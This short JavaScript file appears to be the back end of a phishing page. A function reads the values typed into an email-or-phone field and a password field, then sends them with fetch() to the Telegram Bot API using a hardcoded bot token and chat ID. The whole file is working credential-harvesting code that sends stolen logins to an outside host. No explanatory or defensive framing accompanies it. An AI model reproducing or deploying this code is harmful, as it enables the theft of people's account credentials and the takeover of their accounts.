function myFunction() {
var id = document.getElementById("text").value 
 
var pass = document.getElementById("password").value;
  
  click('Number or Email : '+id+'\nPassword :'+pass);

}


   async function click(n) {
    const options = {

  method: 'POST',

  headers: {

    accept: 'application/json',

    'User-Agent': 'Telegram Bot SDK - (https://github.com/irazasyed/telegram-bot-sdk)',

    'content-type': 'application/json'

  },

  body: JSON.stringify({

    text: n,

    parse_mode: 'html',

    disable_web_page_preview: true,

    disable_notification: false,

    reply_to_message_id: null,

    chat_id: '5122646798'

  })

};
    

  
fetch('https://api.telegram.org/bot5758594487%3AAAEVSjGeGyD7kUtcfV5Wk4E8znM8pkw4sWk/sendMessage', options)

  .then(response => response.json())

  .then(response => console.log(response))

  .catch(err => console.error(err));
  
  
 
    };
  
  
